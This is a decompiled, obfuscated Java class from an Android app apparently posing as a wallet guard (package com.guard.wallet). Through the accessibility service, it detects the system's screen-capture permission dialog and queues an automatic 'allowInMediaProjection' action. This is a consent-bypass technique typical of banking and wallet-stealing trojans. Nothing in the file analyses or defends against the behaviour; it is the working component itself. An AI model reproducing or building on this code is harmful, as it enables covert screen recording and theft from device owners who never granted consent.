package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.req.ListenWindow;
import java.util.Collections;
import java.util.concurrent.ConcurrentLinkedQueue;

public final class o extends e {
   public static final int o = 0;
   public final ConcurrentLinkedQueue n = new ConcurrentLinkedQueue();

   public o() {
      super(Collections.singletonList(H()), "com.android.systemui");
   }

   public static ListenWindow H() {
      ListenWindow var0 = new ListenWindow("com.android.systemui", "com.android.systemui.media.MediaProjectionPermissionActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   @Override
   public final void d() {
      com.guard.wallet.thread.l.a(super.c);
      this.n.clear();
      super.d();
   }

   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      super.u(var1, var2, var3);
      boolean var4;
      if (this.q(Collections.singletonList(H()))) {
         Log.d("o.o", "已进入是否允许屏幕投影权限窗口");
         var4 = true;
      } else {
         var4 = false;
      }

      if (var4) {
         ConcurrentLinkedQueue var5 = this.n;
         if (!var5.contains("allowInMediaProjection")) {
            var5.add("allowInMediaProjection");
            com.guard.wallet.thread.l.c(new a(this, 3), super.c);
         }
      }
   }
}
